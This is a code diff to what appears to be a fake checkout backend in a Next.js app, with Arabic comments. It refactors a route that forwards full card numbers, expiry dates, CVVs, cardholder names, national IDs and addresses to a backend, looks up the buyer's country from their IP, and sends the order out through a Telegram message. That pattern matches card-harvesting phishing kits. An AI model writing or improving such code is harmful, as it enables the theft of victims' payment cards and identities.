@@ -7,25 +7,31 @@ export async function POST(req: NextRequest) {
 
   // جيب الـ IP والدولة
   const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || req.headers.get("x-real-ip") || "";
-  let country = "غير معروف";
   const isLocal = !ip || ip === "127.0.0.1" || ip === "::1";
-  if (!isLocal) {
-    try {
-      const geo = await fetch(`http://ip-api.com/json/${ip}?fields=country`);
-      const geoData = await geo.json();
-      if (geoData.country) country = geoData.country;
-    } catch {}
-  }
+
   const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((total - downPayment) / months) : 0;
 
-  // حفظ في الداتابيز
-  try {
-    await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
+  // حفظ في الداتابيز وجلب الجيو بالتوازي
+  let dbOrderId: string | null = null;
+  let country = "غير معروف";
+
+  const [dbRes, geoRes] = await Promise.allSettled([
+    fetch(`${process.env.BACKEND_URL}/api/checkout`, {
       method: "POST",
       headers: { "Content-Type": "application/json", "x-forwarded-for": ip },
       body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, monthlyPayment, downPayment }),
-    });
-  } catch {}
+    }),
+    isLocal ? Promise.resolve(null) : fetch(`http://ip-api.com/json/${ip}?fields=country`),
+  ]);
+
+  if (dbRes.status === "fulfilled" && dbRes.value.ok) {
+    const dbData = await dbRes.value.json().catch(() => ({}));
+    dbOrderId = dbData._id ?? dbData.id ?? null;
+  }
+  if (geoRes.status === "fulfilled" && geoRes.value) {
+    const geoData = await geoRes.value.json().catch(() => ({}));
+    if (geoData.country) country = geoData.country;
+  }
 
   // Send Telegram
   const text = [
@@ -71,5 +77,5 @@ export async function POST(req: NextRequest) {
     )
   );
 
-  return NextResponse.json({ ok: true, orderId });
+  return NextResponse.json({ ok: true, orderId, dbOrderId });
 }
